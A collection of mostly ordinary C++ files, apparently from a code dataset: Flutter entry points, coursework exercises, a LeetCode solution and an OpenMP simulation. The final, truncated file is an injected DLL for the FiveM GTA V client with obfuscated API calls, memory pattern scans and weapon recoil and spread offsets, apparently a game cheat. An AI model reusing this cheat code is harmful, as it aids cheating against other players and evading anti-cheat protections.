    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"nina_homework\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#define maxn 600000\n\nusing namespace std;\n\nstring plus_jf(string A, string B)\n{\n    string C;\n    int a[maxn] = {0}, b[maxn] = {0}, c[maxn] = {0};\n    int l = max(A.length(), B.length());\n    for (int i = A.length() - 1, j = 1; i >= 0; i--, j++)\n    {\n        a[j] = A[i] - '0';\n    }\n    for (int i = B.length() - 1, j = 1; i >= 0; i--, j++)\n    {\n        b[j] = B[i] - '0';\n    }\n    for (int i = 1; i <= l; i++)\n    {\n        c[i] += a[i] + b[i];\n        c[i + 1] = c[i] / 10;\n        c[i] %= 10;\n    }\n    if (c[l + 1])\n        l++;\n    for (int i = l; i >= 1; i--)\n    {\n        C += c[i] + '0';\n    }\n    return C;\n}\n\nstring minus_jf(string A, string B)\n{\n    string C;\n    int a[maxn] = {0}, b[maxn] = {0}, c[maxn] = {0};\n    int l = max(A.length(), B.length());\n    int sign = 0, k = 0;\n    if (A.length() < B.length())\n    {\n        sign = 1;\n    }\n    else if (A < B && A.length() == B.length())\n    {\n        sign = 1;\n    }\n    for (int i = A.length() - 1, j = 1; i >= 0; i--, j++)\n    {\n        a[j] = A[i] - '0';\n    }\n    for (int i = B.length() - 1, j = 1; i >= 0; i--, j++)\n    {\n        b[j] = B[i] - '0';\n    }\n    for (int i = 1; i <= l; i++)\n    {\n        if (sign == 0)\n        {\n            c[i] += a[i] - b[i];\n        }\n        else\n        {\n            c[i] += b[i] - a[i];\n        }\n        if (c[i] < 0)\n        {\n            c[i + 1]--;\n            c[i] += 10;\n        }\n    }\n    if (sign == 1)\n    {\n        C += \"-\";\n    }\n    for (int i = l; i >= 1; i--)\n    {\n        if (c[i] != 0 || k != 0)\n        {\n            C += c[i] + '0';\n            k = 1;\n        }\n    }\n    if (k == 0)\n    {\n        C = \"0\";\n    }\n    return C;\n}\nint main()\n{\n    string A, B;\n    cin >> A >> B;\n    cout << plus_jf(A, B) << end << minus_jf(A, B);\n}",
    "// Nh\u1eadp 1 s\u1ed1 (Kh\u00f4ng qu\u00e1 500 k\u00ed t\u1ef1)\n// In ra YES n\u1ebfu nh\u01b0 \u0111\u00e2y l\u00e0 s\u1ed1 thu\u1eadn ngh\u1ecbch v\u00e0 ch\u1ec9 ch\u1ee9a ho\u00e0n to\u00e0n c\u00e1c ch\u1eef s\u1ed1 l\u1ebb\n// In ra NO n\u1ebfu ng\u01b0\u1ee3c l\u1ea1i\n\n#include <bits/stdc++.h>\n#define fi first\n#define se second\n#define ms(a, n) memset(a, n, sizeof(a))\n#define endl \"\\n\"\n#define PI 3.141592653589793238\nusing namespace std;\n\nusing ll = long long;\n\ntypedef pair<ll, ll> pl;\ntypedef vector<pl> vll;\ntypedef pair<ll, int> pi;\ntypedef vector<pi> vii;\n\nconst ll modi = 1000000007;\nconst int MAXN = 1e7 + 1;\n\nvoid faster()\n{\n    ios_base::sync_with_stdio(false);\n    cin.tie(0);\n}\n\nint checkReverseNumber(string s)\n{\n    for (int i = 0; i < s.size(); ++i)\n    {\n        if (s[i] != s[s.size() - i - 1])\n            return 0;\n    }\n    return 1;\n}\n\nint checkAllDigitOddOfANumber(string s)\n{\n    for (int i = 0; i < s.size(); ++i)\n    {\n        if ((s[i] - '0') % 2 == 0)\n            return 0;\n    }\n    return 1;\n}\n\nint main()\n{\n    faster();\n    string s;\n    cin >> s;\n    if (checkAllDigitOddOfANumber(s) && checkReverseNumber(s))\n        cout << \"YES\";\n    else\n        cout << \"NO\";\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shopping_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//Using the necessary libraries\n#include <iostream> // Include the iostream library for input and output operations\n#include <vector> // Include the vector library to use the std::vector container\n#include <cmath> // Include the cmath library for mathematical functions such as std::sqrt\n#include <chrono> // Include the chrono library for time-related functions\n#include <thread> // Include the thread library for using sleep_for function\n#include <omp.h>// Include the OpenMP library for parallel programming\n\n\n\n// Particle structure definition\nstruct Particle {\n    double x, y, z;   // Position of the particle in space\n    double vx, vy, vz; // Velocity of the particle in space\n    double mass;      // Mass of the particle\n};\n\n// Function to compute gravitational forces\nvoid compute_forces(std::vector<Particle>& particles) {\n    const double G = 6.67430e-11; // Gravitational constant\n#pragma omp parallel for schedule(dynamic)// Parallelize the outer loop with dynamic scheduling\n\n    for (size_t i = 0; i < particles.size(); ++i) {// Iterates over each particle to calculate forces\n                                           \n        particles[i].vx = particles[i].vy = particles[i].vz = 0.0; // Reset velocities\n\n        for (size_t j = 0; j < particles.size(); ++j) { //Iterates over all particles \n                                                        //to compute interaction with particle i\n\n            if (i != j) { // Avoid self-interaction\n                double dx = particles[j].x - particles[i].x;\n                double dy = particles[j].y - particles[i].y;\n                double dz = particles[j].z - particles[i].z;\n                double dist = std::sqrt(dx * dx + dy * dy + dz * dz);// Calculate distance\n                if (dist > 1e-9) { // Avoid division by zero\n                    double F = (G * particles[i].mass * particles[j].mass) / (dist * dist);// Compute gravitational force\n                    particles[i].vx += F * dx / dist; // Update velocity in x direction\n                    particles[i].vy += F * dy / dist; // Update velocity in y direction\n                    particles[i].vz += F * dz / dist; // Update velocity in z direction\n                }\n            }\n        }\n    }\n}\n\n\n// Function to update particle positions based on velocities\nvoid update_positions(std::vector<Particle>& particles, double dt) {\n#pragma omp parallel for // Parallelize the loop\n    for (auto& p : particles) { //Iterates over each particle to update its position\n        p.x += p.vx * dt; // Update x position\n        p.y += p.vy * dt; // Update y position\n        p.z += p.vz * dt; // Update z position\n    }\n}\n\nint main() { //main using for executing the our code or fuctiong\n    const int num_particles = 1000; // Number of particles\n    const double dt = 0.01; // Time step for the simulation\n    std::vector<Particle> particles(num_particles); // Vector of particles\n\n    // Initialize particles with positions closer together\n    double pos_range = 0.01; // Reduced range for closer initial positions\n    for (auto& p : particles) {//Initializes each particle with random positions and mass\n        p.x = (rand() / (double)RAND_MAX) * pos_range; // Random x position within range\n        p.y = (rand() / (double)RAND_MAX) * pos_range; // Random y position within range\n        p.z = (rand() / (double)RAND_MAX) * pos_range; // Random z position within range\n        p.mass = rand() / (double)RAND_MAX + 1.0; // Random mass between 1.0 and 2.0\n    }\n\n    // Start time measurement\n    auto start = std::chrono::high_resolution_clock::now();\n\n\n    // Simulation loop\n    const int num_steps = 100; // Number of simulation steps\n    for (int step = 0; step < num_steps; ++step) { //Simulation loop, iterates over each simulation step\n        compute_forces(particles); // Compute forces between particles\n        update_positions(particles, dt); // Update positions based on velocities\n\n\n        // Print positions of the first 10 particles (or adjust as needed)\n        std::cout << \"Step \" << step << \":\\n\";\n        for (int i = 0; i < 10 && i < num_particles; ++i) {//Prints the positions of the first 10 particles\n            std::cout << \"Particle \" << i << \": (\"\n                << particles[i].x << \", \"\n                << particles[i].y << \", \"\n                << particles[i].z << \")\\n\";// Output positions of first 10 particles\n        }\n        std::cout << \"\\n\";\n\n        // Sleep to simulate real-time visualization\n        std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Adjust delay as needed\n    }\n    \n    auto end = std::chrono::high_resolution_clock::now();// End time measurement\n    std::chrono::duration<double> elapsed = end - start;// Calculate elapsed time\n    std::cout << \"Parallel execution time: \" << elapsed.count() << \" seconds\\n\";// Output execution time\n\n    return 0;// Indicate successful execution\n}",
    "#include <iostream>\n#include <gtest/gtest.h>\n\n// \u8fd9\u91cc\u628a\u51e0\u4e2a\u5934\u6587\u4ef6\u7684include\u90fd\u6ce8\u91ca\uff0c\u662f\u56e0\u4e3aunit_test.cpp\u4e2d\u5df2\u7ecf\u5305\u542b\u4e86\u8fd9\u4e9b\u5934\u6587\u4ef6\n// \u800c\u672c\u9898\u8981\u6c42\u5728\u5934\u6587\u4ef6\u4e2d\u5b9a\u4e49\u51fd\u6570\uff0c\u5982\u679c\u91cd\u590dinclude\uff0c\u4f1a\u5bfc\u81f4\u51fd\u6570\u91cd\u590d\u5b9a\u4e49\n// \u5176\u5b9e\u6700\u5408\u7406\u7684\u65b9\u5f0f\u5e94\u8be5\u662f\u5c06\u8fd9\u4e9b\u51fd\u6570\u5b9a\u4e49\u5728cpp\u6587\u4ef6\u4e2d\uff0c\u7136\u540e\u5728\u5934\u6587\u4ef6\u4e2d\u58f0\u660e\n// #include \"q1.h\"\n// #include \"q2.h\"\n// #include \"q3.h\"\n// #include \"q4.h\"\n\nint main(int argc, char **argv)\n{\n    if (false) // make false to run unit-tests\n    {\n        // debug section\n        // std::string pattern = \"\\\\d- flight_number:(.+) - duration:(.+) - connections:(\\\\d+) - connection_times:(.+) - price:(\\\\d+)\";\n        // std::regex r(pattern);\n        // std::smatch results;\n        // std::string line;\n        // std::vector<q3::Flight> flights;\n// \n        // // \u6a21\u62df\u8f93\u5165\u6570\u636e\n        // std::vector<std::string> input_data = {\n        //     \"1- flight_number:QR492 - duration:11h30m - connections:3 - connection_times:2h,1h30m,4h15m - price:250\",\n        //     \"2- flight_number:QR720 - duration:12h45m - connections:1 - connection_times:1h - price:200\",\n        //     \"3- flight_number:9724 - duration:13h - connections:2 - connection_times:5h15m,2h45m - price:175\",\n        //     \"4- flight_number:9725 - duration:9h - connections:1 - connection_times:1h - price:150\",\n        //     \"5- flight_number:MA127 - duration:13h30m - connections:1 - connection_times:3h - price:150\",\n        //     \"6- flight_number:GH758 - duration:24h10m - connections:2 - connection_times:3h,1h15m - price:550\"\n        // };\n// \n        // for (const auto& line : input_data) {\n        //     std::cout << line << std::endl;\n        //     if (std::regex_match(line, results, r)) {\n        //         q3::Flight flight;\n        //         flight.flight_number = results.str(1);\n        //         flight.duration = q3::convert_time(results.str(2));\n        //         flight.connections = std::stoi(results.str(3));\n        //         flight.connection_times = q3::concat_times(results.str(4));\n        //         flight.price = std::stoi(results.str(5));\n        //         flights.push_back(flight);\n        //     } else {\n        //         throw std::runtime_error(\"Flight format error!\");\n        //     }\n        // }\n        // for (const auto& flight : flights) {\n        //     std::cout << flight.flight_number << \" \" << flight.duration << \" \" << flight.connections << \" \" << flight.connection_times << \" \" << flight.price << std::endl;\n        // }\n    }\n    else\n    {\n        ::testing::InitGoogleTest(&argc, argv);\n        std::cout << \"RUNNING TESTS ...\" << std::endl;\n        int ret{RUN_ALL_TESTS()};\n        if (!ret)\n            std::cout << \"<<<SUCCESS>>>\" << std::endl;\n        else\n            std::cout << \"FAILED\" << std::endl;\n    }\n    return 0;   \n}",
    "/*\n\nProblem - 44- Kth smalles In Lexographical Order\n\n\nExplanation:\ncountSteps Function:\n\nThis function calculates how many numbers there are between two prefixes in lexicographical order. The numbers between prefix1 and prefix2 at the same depth are counted. Then, the function goes deeper into the tree by multiplying the prefixes by 10 to count the numbers at the next level.\nThis is done until prefix1 exceeds n.\nfindKthNumber Function:\n\nThe main goal of this function is to find the k-th smallest number in lexicographical order between 1 and n.\nWe start at curr = 1 (the smallest number in lexicographical order) and decrement k because 1 is already considered as part of the result.\nThe algorithm checks how many numbers are between curr and curr + 1 using the countSteps function.\nIf there are fewer numbers than k, we skip over these numbers and move to the next sibling (i.e., curr + 1).\nIf k is within the subtree of the current number, we move deeper into the tree (i.e., curr * 10).\nEfficiency:\n\nThe algorithm leverages the lexicographical tree structure and skips large chunks of numbers by calculating steps instead of brute-forcing the entire order, making it very efficient for large values of n.\nTime Complexity:\n\nThe overall time complexity is O(log n), where n is the upper limit of the numbers. This is due to the fact that each call to countSteps explores the numbers in a logarithmic manner.\nThis approach is optimal and ensures that the problem of finding the k-th smallest number in lexicographical order is solved efficiently.\n\n*/\n\nclass Solution {\npublic:\n    // Helper function to count the number of steps between two prefixes in the lexicographical order.\n    int countSteps(int n, long prefix1, long prefix2) {\n        int steps = 0;\n        \n        // Iterate while the first prefix is within the range of numbers [1, n]\n        while (prefix1 <= n) { // Time complexity: O(log(n))\n            // Calculate the number of valid numbers between prefix1 and prefix2 at the current depth\n            // The number of valid steps is the difference between prefix2 and prefix1, \n            // or the difference between prefix1 and (n + 1) if it exceeds n\n            steps += min((long)(n + 1), prefix2) - prefix1;\n            \n            // Move deeper into the lexicographical tree by multiplying by 10\n            // This explores the next level of numbers starting with the same prefix\n            prefix1 *= 10;\n            prefix2 *= 10;\n        }\n        \n        return steps;\n    }\n\n    // Main function to find the k-th smallest number in lexicographical order.\n    int findKthNumber(int n, int k) {\n        int curr = 1; // Start from the first number in lexicographical order (i.e., 1)\n        k--; // We already consider the first number as the current result, so decrement k\n        \n        // While k remains greater than 0, continue to search for the k-th number\n        while (k) { // Time complexity: O(log(n))\n            // Calculate the number of lexicographical steps between 'curr' and 'curr + 1'\n            int step = countSteps(n, curr, curr + 1); // Calculate how many numbers fall between curr and curr+1\n            \n            if (step <= k) { // If the number of steps is less than or equal to k\n                // Move to the next sibling in the current lexicographical order (i.e., curr + 1)\n                curr++; \n                \n                // Subtract the number of steps as we have skipped over these numbers\n                k -= step; \n            } else { // If the k-th number lies within the subtree of the current number\n                // Move deeper into the tree by going down one level (curr becomes curr * 10)\n                curr *= 10; \n                \n                // Decrement k as we have explored the current node\n                k--;\n            }\n        }\n        \n        return curr; // Return the k-th number found in lexicographical order\n    }\n};\n",
    "#include <iostream>\n#include <fstream> // Para ler os arquivos e opera\u00e7\u00f5es de entrada e sa\u00edda.\n#include <cctype> //Biblioteca C com fun\u00e7\u00f5es de manipula\u00e7\u00e3o de caracteres.\n#include <map>\n\nusing namespace std;\n\nint main(){\n    ifstream arq(\"gpl.txt\"); //ifstream --> input file stream\n    ofstream csv(\"palavras.csv\");\n\n    char ch; // Armaznena cada caractere lido do arquivo.\n    string palavra;\n    map<string, int> ocorrencias; //Armazena palavras e a quantidade de vezes que aparecem.\n\n    while(arq.get(ch)){ //L\u00ea caractere por caractere do arquivo \"gpl.txt\".\n        if(isalpha(ch)){ //isalpha verifica se o caractere \u00e9 uma letra.\n            palavra += tolower(ch); //Concatenamos em string e o caracter em maiusculo.\n        }\n        else if(palavra.size() > 0){ //verifica se tem alguma palavra acumulada.\n            cout << palavra << endl;\n            ocorrencias[palavra]++; //Incrementa o contador dessa palavra no mapa.\n            palavra.clear(); //Limpa a vari\u00e1vel \"palavra\" para come\u00e7ar a pr\u00f3xima.\n        }\n    }\n    csv << \"\\\"Palavra\\\";\\\"N\\\"\\n\"; //Coloca o cabe\u00e7alho do arquivo CSV (as colunas \"Palavra\" e \"N\" para contagem).\n    for(auto [k, v] : ocorrencias){ \n        csv << '\"' << k << '\"' << v << endl; //Escrevemos a palavra e sua contagem de ocorr\u00eancias.\n    }\n\n}",
    "#include <iomanip>\n#include <iostream>\n\nusing namespace std;\n\nclass fraction {\n   int numerator;\n   int denominator;\npublic:\n   fraction (){numerator = 0; denominator = 1;}   // inline costructor creates fraction 0/1\n   fraction operator+ (fraction);\n   fraction operator* (fraction);\n   friend fraction operator* (int, fraction);\n   friend ostream& operator<< (ostream&, fraction);\n   friend istream& operator>> (istream&, fraction&);\n\n   // add more functions\n   friend fraction operator* (fraction, int);\n   fraction operator- (fraction);\n   fraction operator/ (fraction);\n};\n\n/*\n * Method to output a mixed fraction using the output operator.\n * left: in-out param storing output stream.\n * right: in param containing fraction to output.\n * Returns pointer to output stream.\n *\n * Note: output is not a simplified fraction, except for 0.\n */\nostream& operator<< (ostream& co, fraction f)\n{\n   // determine if a mixed fraction\n   if (f.numerator >= f.denominator) {\n      co << f.numerator / f.denominator << \" \";\n      f.numerator %= f.denominator;\n   }\n\n   co << f.numerator << \"/\" << f.denominator;\n   return co;\n}\n\n/*\n * Method to input a fraction using the input operator.\n * left: in-out param that contains input stream.\n * right: in-out param containing fraction to output.\n * Returns pointer to input stream.\n */\nistream& operator>> (istream& ci, fraction& f)\n{\n   ci >> f.numerator;\n   ci.get();\n   ci >> f.denominator;\n   return ci;\n}\n\n/*\n * Method to add: fraction1 + fraction2.\n * right: in param containing fraction2 to add to fraction1.\n * Returns sum of the fractions.\n */\nfraction fraction :: operator+ (fraction right)\n{\n   fraction sum;  // sum of two fractions\n\n   // make common denominator\n   sum.denominator = denominator * right.denominator;\n\n   // find new numerators and add together\n   sum.numerator = numerator * (sum.denominator / denominator) +\n                   right.numerator * (sum.denominator / right.denominator);\n\n   // return sum\n   return sum;\n}\n\n/*\n * Method to multiply: fraction1 * fraction2.\n * right: in param containing fraction2 to multiply by fraction1.\n * Returns product of the fractions.\n */\nfraction fraction :: operator* (fraction right)\n{\n   fraction prod;  // product of two fractions\n\n   prod.numerator = numerator * right.numerator;\n   prod.denominator = denominator * right.denominator;\n\n   return prod;\n}\n\n/*\n * Method to multiply: integer * fraction2.\n * left: in param containing an integer.\n * right: in param containing fraction2 to multiply by integer.\n * Returns product of the integer * fraction2.\n */\nfraction operator* (int left, fraction right)\n{\n   fraction prod;  // product of two fractions\n\n   prod.numerator = left * right.numerator;\n   prod.denominator = right.denominator;\n\n   return prod;\n}\n\nfraction operator* (fraction left, int right)\n{\n   return right*left;\n}\n\nfraction fraction :: operator- (fraction right) {\n   fraction diff;  // diff of two fractions\n\n   // make common denominator\n   diff.denominator = this->denominator * right.denominator;\n\n   // find new numerators and add together\n   diff.numerator = this->numerator * right.denominator  -\n                   right.numerator * this->denominator;\n\n   return diff;\n}\n\nfraction fraction::operator / (fraction right) {\n   fraction div;\n\n   div.numerator = numerator * right.denominator;\n   div.denominator = denominator * right.numerator;\n   return div;\n}\n\nint main() {\n   fraction fract1, fract2;   // two fraction objects\n\n   // test for extraction operator >>\n   cout << \"Enter two fractions: \";\n   cin >> fract1 >> fract2;\n   cout << \"\\n\";\n\n   // tests for insertion operator >>\n   cout << \"The fractions are  : \" << fract1;\n   cout << \" and \" << fract2 << endl;\n\n   // tests for multiplication\n   cout << \"\\nmultiplication: \" << endl;\n   cout << \"fraction x fraction: \" << fract1 << \" x \" << fract2 << \" = \" << fract1 * fract2 << endl;\n   cout << \"int x fraction : 5 x \" << fract1 << \" = \" << 5 * fract1 << endl;\n   cout << \"fraction x int : \" << fract1 << \" x 5 = \" << fract1 * 5 << endl;\n\n   // tests for subtraction\n   cout << \"\\nsubtractionn: \" << fract1 << \" - \" << fract2 << \" = \" << fract1 - fract2 << endl;\n   cout << \"subtractionn: \" << fract2 << \" - \" << fract1 << \" = \" << fract2 - fract1 << endl;\n\n   // test for division\n   cout << \"\\ndivision: \" << fract1 << \" / \" << fract2 << \" = \" << fract1 / fract2 << endl;\n\n   return 0;\n}",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
